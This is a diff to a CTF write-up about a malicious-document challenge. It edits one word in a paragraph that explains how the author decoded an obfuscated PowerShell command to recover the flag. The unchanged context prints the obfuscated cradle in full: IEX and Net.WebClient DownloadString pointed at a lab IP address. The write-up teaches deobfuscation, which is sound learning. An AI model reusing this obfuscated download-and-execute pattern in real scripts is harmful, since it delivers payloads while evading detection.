@@ -83,7 +83,7 @@ Decoding this reveals a semi-obfuscated command
 
 `&(“{1}{0}” -f ‘EX’,’I’)(&(“{1}{0}{2}”-f ‘Obje’,’New-‘,’ct’) (“{1}{4}{3}{0}{2}” -f’Clie’,’N’,’nt’,’t.Web’,’e’)).(“{1}{3}{0}{2}” -f ‘trin’,’Downl’,’g’,’oadS’).Invoke(("{52}{53}{54}{2}{8}{49}{47}{4}{14}{28}{10}{7}{51}{19}{48}{33}{7}{5}{50}" -f 'Y','P','E','u','M','X','n','0','P','f','d','e','&','/','4','Se','g','i','n','s','e','E','5','8','2','V','vz','M','l','A','a','bad','er','r','o','u','p','PP','zZ','down','up','ev','il','exe','ps','4','m','{','_','T','}','c','https', '://','192.168.143.128/'))`
 
-This looks like something deciding the order of the characters in the command. It's clear that the first sequence spells `IEX`, second `New-Object`, third `Net.WebClient` etc. So what's left in the final sequence is just mapping the numbers to the corresponding characters.
+This looks like something deciding the order of the characters in the command. It's clear that the first sequence spells `IEX`, second `New-Object`, third `Net.WebClient` etc. So what's left in the final sequence is just mapping the numbers to the corresponding characters/values.
 
 Due to my severely limited understanding of bash, python or even powershell, I just manually mapped the corresponding chars and numbers, and easily enough got the flag: `EPT{M4ld0cs_r0X}`. But again, CTFs are all about learning by doing, so I figured I'd give it a try anyways:
 
